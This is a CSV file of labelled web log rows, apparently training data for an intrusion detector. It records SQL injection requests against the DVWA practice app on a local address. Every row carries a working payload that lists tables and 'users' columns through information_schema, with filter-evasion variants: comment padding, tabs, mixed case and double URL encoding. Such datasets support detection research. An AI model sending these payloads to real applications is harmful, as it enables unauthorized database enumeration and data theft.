ip,timestamp,method,url,path,query,protocol,status,size,response_time,referer,user_agent,decoded_url,decoded_query,body,decoded_body,content_type,is_json_payload,json_depth,param_count_body,attack_type,existing_label,label,label_source,request_hash
192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id%3D1%27%2F%2A%2A%2FAND%2F%2A%2A%2F%28SELECT%2F%2A%2A%2FCOUNT%28%2A%29%2F%2A%2A%2FFROM%2F%2A%2A%2Finformation_schema.columns%2F%2A%2A%2FWHERE%2F%2A%2A%2Ftable_name%3D%27users%27%29%3E0%2F%2A%2A%2F%2F%2A,/vulnerabilities/sqli/,id%3D1%27%2F%2A%2A%2FAND%2F%2A%2A%2F%28SELECT%2F%2A%2A%2FCOUNT%28%2A%29%2F%2A%2A%2FFROM%2F%2A%2A%2Finformation_schema.columns%2F%2A%2A%2FWHERE%2F%2A%2A%2Ftable_name%3D%27users%27%29%3E0%2F%2A%2A%2F%2F%2A,HTTP/1.1,200,2570,0,http://127.0.0.1/dvwa/,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15",/vulnerabilities/sqli/?id=1'/**/AND/**/(SELECT/**/COUNT(*)/**/FROM/**/information_schema.columns/**/WHERE/**/table_name='users')>0/**//*,id=1'/**/AND/**/(SELECT/**/COUNT(*)/**/FROM/**/information_schema.columns/**/WHERE/**/table_name='users')>0/**//*,,,,0,0,0,sqli_info_schema,1,1,existing_log_label,4e5d706e08bc088611f84ace06457e91
192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id%3D1%27%2BAND%2B%28SELECT%2BCOUNT%28%2A%29%2BFROM%2Binformation_schema.columns%2BWHERE%2Btable_name%3D%27users%27%29%3E0%2B%3B--%2B-,/vulnerabilities/sqli/,id%3D1%27%2BAND%2B%28SELECT%2BCOUNT%28%2A%29%2BFROM%2Binformation_schema.columns%2BWHERE%2Btable_name%3D%27users%27%29%3E0%2B%3B--%2B-,HTTP/1.1,200,2787,0,http://127.0.0.1/dvwa/,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,/vulnerabilities/sqli/?id=1'+AND+(SELECT+COUNT(*)+FROM+information_schema.columns+WHERE+table_name='users')>0+;--+-,id=1'+AND+(SELECT+COUNT(*)+FROM+information_schema.columns+WHERE+table_name='users')>0+;--+-,,,,0,0,0,sqli_info_schema,1,1,existing_log_label,9e2cde986676588fe2a0e4dea447cfe9
192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,"/vulnerabilities/sqli/?id%3D1%27+ union +Select column_name, +table_name From++information_schema.columns +WHERE+ table_name%3D%27users%27 #",/vulnerabilities/sqli/,"id%3D1%27+ union +Select column_name, +table_name From++information_schema.columns +WHERE+ table_name%3D%27users%27 ",HTTP/1.1,200,674,1,http://127.0.0.1/dvwa/,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15","/vulnerabilities/sqli/?id=1'  union  Select column_name,  table_name From  information_schema.columns  WHERE  table_name='users' #","id=1'  union  Select column_name,  table_name From  information_schema.columns  WHERE  table_name='users' ",,,,0,0,0,sqli_info_schema,1,1,existing_log_label,4891774f0a30a1e2f99f73f6e5a0b954
192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id%3D1%27+UNION+SELECT+column_name%2C+table_name+FROM+information_schema.columns+WHERE+table_name%3D%27users%27+--+-,/vulnerabilities/sqli/,id%3D1%27+UNION+SELECT+column_name%2C+table_name+FROM+information_schema.columns+WHERE+table_name%3D%27users%27+--+-,HTTP/1.1,200,3283,1,http://127.0.0.1/dvwa/,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15","/vulnerabilities/sqli/?id=1' UNION SELECT column_name, table_name FROM information_schema.columns WHERE table_name='users' -- -","id=1' UNION SELECT column_name, table_name FROM information_schema.columns WHERE table_name='users' -- -",,,,0,0,0,sqli_info_schema,1,1,existing_log_label,75b748ae24a0558eff4b8f17936f1681
192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id%3D1%27%09AND%09%28SELECT%09COUNT%28%2A%29%09FROM%09information_schema.columns%09WHERE%09table_name%3D%27users%27%29%3E0%09%2523,/vulnerabilities/sqli/,id%3D1%27%09AND%09%28SELECT%09COUNT%28%2A%29%09FROM%09information_schema.columns%09WHERE%09table_name%3D%27users%27%29%3E0%09%2523,HTTP/1.1,200,3364,0,http://127.0.0.1/dvwa/,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15",/vulnerabilities/sqli/?id=1'	AND	(SELECT	COUNT(*)	FROM	information_schema.columns	WHERE	table_name='users')>0	%23,id=1'	AND	(SELECT	COUNT(*)	FROM	information_schema.columns	WHERE	table_name='users')>0	%23,,,,0,0,0,sqli_info_schema,1,1,existing_log_label,49ac604076e0eb3dd48c9760ec901ea9
192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id=id%253D1%2527%2509And%2509%2528SELECT%2509COUNT%2528%252A%2529%2509from%2509information_schema.columns%2509Where%2509table_name%253D%2527users%2527%2529%253E0%2509%252523&Submit=Submit,/vulnerabilities/sqli/,id=id%253D1%2527%2509And%2509%2528SELECT%2509COUNT%2528%252A%2529%2509from%2509information_schema.columns%2509Where%2509table_name%253D%2527users%2527%2529%253E0%2509%252523&Submit=Submit,HTTP/1.1,200,3936,0,http://127.0.0.1/dvwa/,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15",/vulnerabilities/sqli/?id=id%3D1%27%09And%09%28SELECT%09COUNT%28%2A%29%09from%09information_schema.columns%09Where%09table_name%3D%27users%27%29%3E0%09%2523&Submit=Submit,id=id%3D1%27%09And%09%28SELECT%09COUNT%28%2A%29%09from%09information_schema.columns%09Where%09table_name%3D%27users%27%29%3E0%09%2523&Submit=Submit,,,,0,0,0,sqli_info_schema,1,1,existing_log_label,da3b44743faad0d651b2ce2ce7540354
192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,"/vulnerabilities/sqli/?id%3D1'%2F%2A*/UNION%2F%2A*%2FSELECT/%2A*%2Fcolumn_name,%2F%2A%2A%2Ftable_name%2F%2A%2A%2FFROM/%2A*/information_schema.columns%2F%2A%2A%2FWHERE%2F%2A%2A/table_name%3D%27users%27%2F%2A*%2F%3B--%2F*%2A/-",/vulnerabilities/sqli/,"id%3D1'%2F%2A*/UNION%2F%2A*%2FSELECT/%2A*%2Fcolumn_name,%2F%2A%2A%2Ftable_name%2F%2A%2A%2FFROM/%2A*/information_schema.columns%2F%2A%2A%2FWHERE%2F%2A%2A/table_name%3D%27users%27%2F%2A*%2F%3B--%2F*%2A/-",HTTP/1.1,200,3077,0,http://127.0.0.1/dvwa/,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,"/vulnerabilities/sqli/?id=1'/**/UNION/**/SELECT/**/column_name,/**/table_name/**/FROM/**/information_schema.columns/**/WHERE/**/table_name='users'/**/;--/**/-","id=1'/**/UNION/**/SELECT/**/column_name,/**/table_name/**/FROM/**/information_schema.columns/**/WHERE/**/table_name='users'/**/;--/**/-",,,,0,0,0,sqli_info_schema,1,1,existing_log_label,53fc4014b0d1d04f2e1691b806f6fe8b
192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id%3D1%27%2520UNION%2520SELECT%2520column_name%2C%2520table_name%2520FROM%2520information_schema.columns%2520WHERE%2520table_name%3D%27users%27%2520--,/vulnerabilities/sqli/,id%3D1%27%2520UNION%2520SELECT%2520column_name%2C%2520table_name%2520FROM%2520information_schema.columns%2520WHERE%2520table_name%3D%27users%27%2520--,HTTP/1.1,200,823,1,http://127.0.0.1/dvwa/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36","/vulnerabilities/sqli/?id=1'%20UNION%20SELECT%20column_name,%20table_name%20FROM%20information_schema.columns%20WHERE%20table_name='users'%20--","id=1'%20UNION%20SELECT%20column_name,%20table_name%20FROM%20information_schema.columns%20WHERE%20table_name='users'%20--",,,,0,0,0,sqli_info_schema,1,1,existing_log_label,fee376a4cb492b379e78607179c7df8a
192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id%3D1%27%2F%2A%2A%2FUNION%2F%2A%2A%2FSELECT%2F%2A%2A%2Fcolumn_name%2C%2F%2A%2A%2Ftable_name%2F%2A%2A%2FFROM%2F%2A%2A%2Finformation_schema.columns%2F%2A%2A%2FWHERE%2F%2A%2A%2Ftable_name%3D%27users%27%2F%2A%2A%2F%23,/vulnerabilities/sqli/,id%3D1%27%2F%2A%2A%2FUNION%2F%2A%2A%2FSELECT%2F%2A%2A%2Fcolumn_name%2C%2F%2A%2A%2Ftable_name%2F%2A%2A%2FFROM%2F%2A%2A%2Finformation_schema.columns%2F%2A%2A%2FWHERE%2F%2A%2A%2Ftable_name%3D%27users%27%2F%2A%2A%2F%23,HTTP/1.1,200,4006,0,http://127.0.0.1/dvwa/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36","/vulnerabilities/sqli/?id=1'/**/UNION/**/SELECT/**/column_name,/**/table_name/**/FROM/**/information_schema.columns/**/WHERE/**/table_name='users'/**/#","id=1'/**/UNION/**/SELECT/**/column_name,/**/table_name/**/FROM/**/information_schema.columns/**/WHERE/**/table_name='users'/**/#",,,,0,0,0,sqli_info_schema,1,1,existing_log_label,9a5b8b6866faa80ad8286c1ec748b6a9
192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,"/vulnerabilities/sqli/?id=1%27+union select+table_name,+table_schema from information_schema.tables+%23",/vulnerabilities/sqli/,"id=1%27+union select+table_name,+table_schema from information_schema.tables+%23",HTTP/1.1,200,2050,1,http://127.0.0.1/dvwa/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36","/vulnerabilities/sqli/?id=1' union select table_name, table_schema from information_schema.tables #","id=1' union select table_name, table_schema from information_schema.tables #",,,,0,0,0,sqli_info_schema,1,1,existing_log_label,bd21162369849bd62221e86e76914cbc
192.168.145.135,12/Sep/2026:14:16:10 +0700,POST,/search.php,/search.php,,HTTP/1.1,200,2767,0,http://127.0.0.1/dvwa/,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,/search.php,,"id=1'+Union+sELeCT+column_name,+table_name+FrOm+information_schema.columns+WhERe+table_name='users'+--","id=1' Union sELeCT column_name, table_name FrOm information_schema.columns WhERe table_name='users' --",application/x-www-form-urlencoded,0,0,1,sqli_info_schema,1,1,existing_log_label,fc3db92de84279024ed5191dbe1f8aa8
192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id=id%253D1%2527%252BAND%252B%2528SELECT%252BCOUNT%2528%252A%2529%252BFROM%252Binformation_schema.columns%252BWHERE%252Btable_name%253D%2527users%2527%2529%253E0%252B--&Submit=Submit,/vulnerabilities/sqli/,id=id%253D1%2527%252BAND%252B%2528SELECT%252BCOUNT%2528%252A%2529%252BFROM%252Binformation_schema.columns%252BWHERE%252Btable_name%253D%2527users%2527%2529%253E0%252B--&Submit=Submit,HTTP/1.1,200,1904,1,http://127.0.0.1/dvwa/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",/vulnerabilities/sqli/?id=id%3D1%27%2BAND%2B%28SELECT%2BCOUNT%28%2A%29%2BFROM%2Binformation_schema.columns%2BWHERE%2Btable_name%3D%27users%27%29%3E0%2B--&Submit=Submit,id=id%3D1%27%2BAND%2B%28SELECT%2BCOUNT%28%2A%29%2BFROM%2Binformation_schema.columns%2BWHERE%2Btable_name%3D%27users%27%29%3E0%2B--&Submit=Submit,,,,0,0,0,sqli_info_schema,1,1,existing_log_label,9257e65dd48e17d7c9d9051ddce620b4
192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,"/vulnerabilities/sqli/?id=1'+UNION+SELECT+column_name,+table_name+from+information_schema.columns+Where+table_name='users'+#",/vulnerabilities/sqli/,"id=1'+UNION+SELECT+column_name,+table_name+from+information_schema.columns+Where+table_name='users'+",HTTP/1.1,200,1487,1,http://127.0.0.1/dvwa/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36","/vulnerabilities/sqli/?id=1' UNION SELECT column_name, table_name from information_schema.columns Where table_name='users' #","id=1' UNION SELECT column_name, table_name from information_schema.columns Where table_name='users' ",,,,0,0,0,sqli_info_schema,1,1,existing_log_label,2586828841e24aa7bf56d68671dea5ba
192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,"/vulnerabilities/sqli/?id%3D1'+UNION SELECT+column_name,+table_name FROM information_schema.columns WHERE+table_name%3D'users%27 --+-",/vulnerabilities/sqli/,"id%3D1'+UNION SELECT+column_name,+table_name FROM information_schema.columns WHERE+table_name%3D'users%27 --+-",HTTP/1.1,200,956,1,http://127.0.0.1/dvwa/,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15","/vulnerabilities/sqli/?id=1' UNION SELECT column_name, table_name FROM information_schema.columns WHERE table_name='users' -- -","id=1' UNION SELECT column_name, table_name FROM information_schema.columns WHERE table_name='users' -- -",,,,0,0,0,sqli_info_schema,1,1,existing_log_label,75b748ae24a0558eff4b8f17936f1681
192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id=id%253D1%2527%2BAND%2B%2528SELECT%2BCOUNT%2528%252A%2529%2BFROM%2Binformation_schema.columns%2BWHERE%2Btable_name%253D%2527users%2527%2529%253E0%2B%2523&Submit=Submit,/vulnerabilities/sqli/,id=id%253D1%2527%2BAND%2B%2528SELECT%2BCOUNT%2528%252A%2529%2BFROM%2Binformation_schema.columns%2BWHERE%2Btable_name%253D%2527users%2527%2529%253E0%2B%2523&Submit=Submit,HTTP/1.1,200,632,0,http://127.0.0.1/dvwa/,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,/vulnerabilities/sqli/?id=id%3D1%27+AND+%28SELECT+COUNT%28%2A%29+FROM+information_schema.columns+WHERE+table_name%3D%27users%27%29%3E0+%23&Submit=Submit,id=id%3D1%27+AND+%28SELECT+COUNT%28%2A%29+FROM+information_schema.columns+WHERE+table_name%3D%27users%27%29%3E0+%23&Submit=Submit,,,,0,0,0,sqli_info_schema,1,1,existing_log_label,8b8066b673b807771a447b5dcd5892a5
192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id%3D1%27+ANd+(SELECT COUNT(*)+FrOM+information_schema.columns WHERE table_name=%27users%27)>0+%23,/vulnerabilities/sqli/,id%3D1%27+ANd+(SELECT COUNT(*)+FrOM+information_schema.columns WHERE table_name=%27users%27)>0+%23,HTTP/1.1,200,3771,1,http://127.0.0.1/dvwa/,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15",/vulnerabilities/sqli/?id=1' ANd (SELECT COUNT(*) FrOM information_schema.columns WHERE table_name='users')>0 #,id=1' ANd (SELECT COUNT(*) FrOM information_schema.columns WHERE table_name='users')>0 #,,,,0,0,0,sqli_info_schema,1,1,existing_log_label,f3b94a50334d8a1e317fc0dcd088a6f1
192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id%3D1%27%2F%2A%2A%2Funion%2F%2A%2A%2FsELEct%2F%2A%2A%2Ftable_name%2C%2F%2A%2A%2Ftable_schema%2F%2A%2A%2FFRoM%2F%2A%2A%2Finformation_schema.tables%2F%2A%2A%2F%2F%2A,/vulnerabilities/sqli/,id%3D1%27%2F%2A%2A%2Funion%2F%2A%2A%2FsELEct%2F%2A%2A%2Ftable_name%2C%2F%2A%2A%2Ftable_schema%2F%2A%2A%2FFRoM%2F%2A%2A%2Finformation_schema.tables%2F%2A%2A%2F%2F%2A,HTTP/1.1,200,1150,0,http://127.0.0.1/dvwa/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36","/vulnerabilities/sqli/?id=1'/**/union/**/sELEct/**/table_name,/**/table_schema/**/FRoM/**/information_schema.tables/**//*","id=1'/**/union/**/sELEct/**/table_name,/**/table_schema/**/FRoM/**/information_schema.tables/**//*",,,,0,0,0,sqli_info_schema,1,1,existing_log_label,88f0bb1ef2a4641956c2c1e74119b431
192.168.145.135,12/Sep/2026:14:16:10 +0700,POST,/vulnerabilities/sqli/,/vulnerabilities/sqli/,,HTTP/1.1,200,2960,0,http://127.0.0.1/dvwa/,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,/vulnerabilities/sqli/,,"id=1%27+union+selECt+column_name,+table_name+from+information_schema.columns where+table_name=%27users%27+#","id=1' union selECt column_name, table_name from information_schema.columns where table_name='users' #",application/x-www-form-urlencoded,0,0,1,sqli_info_schema,1,1,existing_log_label,88cf22e8b6c2b3550e09b4af1cd9582d
192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,"/vulnerabilities/sqli/?id%3D1%27+UNION+SELECT+column_name,+table_name+FROM+information_schema.columns+WhEre+table_name=%27users'+#",/vulnerabilities/sqli/,"id%3D1%27+UNION+SELECT+column_name,+table_name+FROM+information_schema.columns+WhEre+table_name=%27users'+",HTTP/1.1,200,2449,0,http://127.0.0.1/dvwa/,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,"/vulnerabilities/sqli/?id=1' UNION SELECT column_name, table_name FROM information_schema.columns WhEre table_name='users' #","id=1' UNION SELECT column_name, table_name FROM information_schema.columns WhEre table_name='users' ",,,,0,0,0,sqli_info_schema,1,1,existing_log_label,232243519b479e000c23ad6eb779dfc9
192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,"/vulnerabilities/sqli/?id=1'%20UNION%20Select%20table_name,%20table_schema%20From%20information_schema.tables%20%2F*",/vulnerabilities/sqli/,"id=1'%20UNION%20Select%20table_name,%20table_schema%20From%20information_schema.tables%20%2F*",HTTP/1.1,200,1988,0,http://127.0.0.1/dvwa/,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15","/vulnerabilities/sqli/?id=1' UNION Select table_name, table_schema From information_schema.tables /*","id=1' UNION Select table_name, table_schema From information_schema.tables /*",,,,0,0,0,sqli_info_schema,1,1,existing_log_label,62a1ed0018b0a9fcb92bef848c4c2f76
192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,"/vulnerabilities/sqli/?id=1'/**/UNION/**/SELECT/**/table_name,/**/table_schema/**/From/**/information_schema.tables/**/--",/vulnerabilities/sqli/,"id=1'/**/UNION/**/SELECT/**/table_name,/**/table_schema/**/From/**/information_schema.tables/**/--",HTTP/1.1,200,2467,0,http://127.0.0.1/dvwa/,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15","/vulnerabilities/sqli/?id=1'/**/UNION/**/SELECT/**/table_name,/**/table_schema/**/From/**/information_schema.tables/**/--","id=1'/**/UNION/**/SELECT/**/table_name,/**/table_schema/**/From/**/information_schema.tables/**/--",,,,0,0,0,sqli_info_schema,1,1,existing_log_label,c500d1e6666e4c9efac12c586af6eb76
192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id=1'/**/AND/**/(SELECT/**/COUNT(*)/**/FROM/**/information_schema.columns/**/WHERE/**/table_name='users')>0/**/--/**/-,/vulnerabilities/sqli/,id=1'/**/AND/**/(SELECT/**/COUNT(*)/**/FROM/**/information_schema.columns/**/WHERE/**/table_name='users')>0/**/--/**/-,HTTP/1.1,200,3735,0,http://127.0.0.1/dvwa/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",/vulnerabilities/sqli/?id=1'/**/AND/**/(SELECT/**/COUNT(*)/**/FROM/**/information_schema.columns/**/WHERE/**/table_name='users')>0/**/--/**/-,id=1'/**/AND/**/(SELECT/**/COUNT(*)/**/FROM/**/information_schema.columns/**/WHERE/**/table_name='users')>0/**/--/**/-,,,,0,0,0,sqli_info_schema,1,1,existing_log_label,0ecc1eff1beb945a94920ac5c7c923e6
192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id=1'+And+(SELECT+COUNT(*)+FROM+information_schema.columns+Where+table_name='users')>0+--+-,/vulnerabilities/sqli/,id=1'+And+(SELECT+COUNT(*)+FROM+information_schema.columns+Where+table_name='users')>0+--+-,HTTP/1.1,200,3280,1,http://127.0.0.1/dvwa/,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15",/vulnerabilities/sqli/?id=1' And (SELECT COUNT(*) FROM information_schema.columns Where table_name='users')>0 -- -,id=1' And (SELECT COUNT(*) FROM information_schema.columns Where table_name='users')>0 -- -,,,,0,0,0,sqli_info_schema,1,1,existing_log_label,7d52631c682bee64922fc4726cdbd821
192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,"/vulnerabilities/sqli/?id%3D1'%20Union%20sELecT%20column_name,%20table_name%20FRoM%20information_schema.columns%20WHERE%20table_name%3D'users'%20--",/vulnerabilities/sqli/,"id%3D1'%20Union%20sELecT%20column_name,%20table_name%20FRoM%20information_schema.columns%20WHERE%20table_name%3D'users'%20--",HTTP/1.1,200,4262,1,http://127.0.0.1/dvwa/,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15","/vulnerabilities/sqli/?id=1' Union sELecT column_name, table_name FRoM information_schema.columns WHERE table_name='users' --","id=1' Union sELecT column_name, table_name FRoM information_schema.columns WHERE table_name='users' --",,,,0,0,0,sqli_info_schema,1,1,existing_log_label,cf19ee8af568fcadef54e043676c8de4
192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,"/vulnerabilities/sqli/?id%3D1' UNION+Select+column_name,+table_name From+information_schema.columns+WHERE table_name=%27users%27+-- -",/vulnerabilities/sqli/,"id%3D1' UNION+Select+column_name,+table_name From+information_schema.columns+WHERE table_name=%27users%27+-- -",HTTP/1.1,200,827,1,http://127.0.0.1/dvwa/,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,"/vulnerabilities/sqli/?id=1' UNION Select column_name, table_name From information_schema.columns WHERE table_name='users' -- -","id=1' UNION Select column_name, table_name From information_schema.columns WHERE table_name='users' -- -",,,,0,0,0,sqli_info_schema,1,1,existing_log_label,36c9db2f5f470327565cdc3ee896e981
192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id=1%27+AND+(SELECT+COUNT(%2A)+FroM+information_schema.columns+Where table_name%3D'users%27)>0+#,/vulnerabilities/sqli/,id=1%27+AND+(SELECT+COUNT(%2A)+FroM+information_schema.columns+Where table_name%3D'users%27)>0+,HTTP/1.1,200,1684,1,http://127.0.0.1/dvwa/,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,/vulnerabilities/sqli/?id=1' AND (SELECT COUNT(*) FroM information_schema.columns Where table_name='users')>0 #,id=1' AND (SELECT COUNT(*) FroM information_schema.columns Where table_name='users')>0 ,,,,0,0,0,sqli_info_schema,1,1,existing_log_label,447f062d5b4dd47abecc8c7306b5c972
192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id=id%253D1%2527%2509UNION%2509seLect%2509table_name%252C%2509table_schema%2509FROM%2509information_schema.tables%2509%252F%252A&Submit=Submit,/vulnerabilities/sqli/,id=id%253D1%2527%2509UNION%2509seLect%2509table_name%252C%2509table_schema%2509FROM%2509information_schema.tables%2509%252F%252A&Submit=Submit,HTTP/1.1,200,3870,1,http://127.0.0.1/dvwa/,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15",/vulnerabilities/sqli/?id=id%3D1%27%09UNION%09seLect%09table_name%2C%09table_schema%09FROM%09information_schema.tables%09%2F%2A&Submit=Submit,id=id%3D1%27%09UNION%09seLect%09table_name%2C%09table_schema%09FROM%09information_schema.tables%09%2F%2A&Submit=Submit,,,,0,0,0,sqli_info_schema,1,1,existing_log_label,9b4a1cdfeac9e8194cac20d1338a254b
192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,"/vulnerabilities/sqli/?id=1' Union Select table_name,+table_schema from information_schema.tables+%23",/vulnerabilities/sqli/,"id=1' Union Select table_name,+table_schema from information_schema.tables+%23",HTTP/1.1,200,3486,1,http://127.0.0.1/dvwa/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36","/vulnerabilities/sqli/?id=1' Union Select table_name, table_schema from information_schema.tables #","id=1' Union Select table_name, table_schema from information_schema.tables #",,,,0,0,0,sqli_info_schema,1,1,existing_log_label,fbca9cf0c5b05820e1ba933798f5b4ee
192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,"/vulnerabilities/sqli/?id%3D1' Union+sELect+table_name, table_schema+From+information_schema.tables+%3B--+-",/vulnerabilities/sqli/,"id%3D1' Union+sELect+table_name, table_schema+From+information_schema.tables+%3B--+-",HTTP/1.1,200,2225,0,http://127.0.0.1/dvwa/,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,"/vulnerabilities/sqli/?id=1' Union sELect table_name, table_schema From information_schema.tables ;-- -","id=1' Union sELect table_name, table_schema From information_schema.tables ;-- -",,,,0,0,0,sqli_info_schema,1,1,existing_log_label,642db6436d3b9046e2cbe1db26082a60
